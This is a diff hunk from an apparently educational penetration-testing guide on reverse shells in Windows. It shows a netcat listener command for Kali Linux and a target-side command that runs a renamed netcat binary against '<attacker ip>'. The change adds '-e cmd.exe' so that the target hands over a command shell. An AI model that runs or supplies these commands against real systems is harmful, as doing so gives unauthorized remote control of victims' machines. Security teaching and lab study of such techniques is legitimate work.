@@ -167,7 +167,7 @@ __Download the reverse shell in windows__
   - > __run the below command in kali linux__
     > __`nc -nvlp 1234`__
   - > __we need to run the file in target system__
-    - __`new.exe -nv <attacker ip> 1234`__
+    - __`new.exe -nv <attacker ip> 1234 -e cmd.exe`__
 
 
 
